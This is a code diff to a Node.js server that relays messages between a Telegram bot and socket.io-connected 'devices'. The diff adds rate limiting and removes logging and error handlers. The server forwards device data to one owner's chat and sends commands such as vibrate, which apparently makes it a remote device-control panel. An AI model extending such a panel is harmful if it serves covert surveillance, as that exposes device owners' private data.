@@ -4,7 +4,7 @@ const { Server } = require('socket.io');
 const telegramBot = require('node-telegram-bot-api');
 const fs = require('fs');
 
-// ========== قراءة الإعدادات من ملف data.json ==========
+// ========== قراءة الإعدادات ==========
 let data;
 try {
     data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
@@ -31,7 +31,6 @@ const bot = new telegramBot(data.token, {
     }
 });
 
-// معالجة أخطاء البولينغ
 bot.on('polling_error', (error) => {
     console.log('⚠️ Polling error:', error.code);
     if (error.code === 'ETELEGRAM' || error.code === 'ECONNRESET') {
@@ -48,6 +47,21 @@ bot.on('polling_error', (error) => {
 
 // ========== تخزين البيانات ==========
 const connectedDevices = new Map();
+const requestLog = new Map();
+
+// ========== دالة تحديد الطلبات ==========
+function isRateLimited(deviceId) {
+    const now = Date.now();
+    const lastRequest = requestLog.get(deviceId) || 0;
+    const timeSince = now - lastRequest;
+    
+    // السماح بطلب واحد كل 2 ثانية
+    if (timeSince < 2000) {
+        return true;
+    }
+    requestLog.set(deviceId, now);
+    return false;
+}
 
 // ========== إعدادات Express ==========
 app.use(express.json());
@@ -104,15 +118,7 @@ bot.onText(/📱 Devices/, (msg) => {
     if (chatId.toString() !== data.id) return;
 
     if (connectedDevices.size === 0) {
-        bot.sendMessage(data.id, '❌ No devices connected', {
-            reply_markup: {
-                keyboard: [
-                    ['📱 Devices', '📳 Vibrate'],
-                    ['🔔 Test Notification', '❌ Cancel']
-                ],
-                resize_keyboard: true
-            }
-        });
+        bot.sendMessage(data.id, '❌ No devices connected');
         return;
     }
 
@@ -223,8 +229,16 @@ io.on('connection', (socket) => {
         bot.sendMessage(data.id, `📩 Device received: ${request} from ${device?.name || 'Unknown'}`);
     });
 
-    // ========== استقبال البيانات من الجهاز ==========
+    // ========== استقبال البيانات من الجهاز مع تحديد الطلبات ==========
     socket.on('data', (socketData) => {
+        const deviceId = socket.id;
+        
+        // التحقق من الحد الأقصى للطلبات
+        if (isRateLimited(deviceId)) {
+            console.log(`⏳ Rate limited: ${deviceId}`);
+            return;
+        }
+        
         const { type, content } = socketData;
         const device = connectedDevices.get(socket.id);
         const deviceName = device?.name || 'Unknown';
@@ -312,14 +326,5 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Server running on port ${PORT}`);
     console.log(`✅ Bot is ready!`);
     console.log(`✅ Connected devices: 0`);
-    console.log(`✅ Using data.json with token: ${data.token.substring(0, 15)}...`);
-});
-
-// ========== معالجة الأخطاء ==========
-process.on('uncaughtException', (error) => {
-    console.error('❌ Uncaught Exception:', error);
-});
-
-process.on('unhandledRejection', (reason, promise) => {
-    console.error('❌ Unhandled Rejection:', reason);
+    console.log(`✅ Rate limiting: 1 request per 2 seconds`);
 });
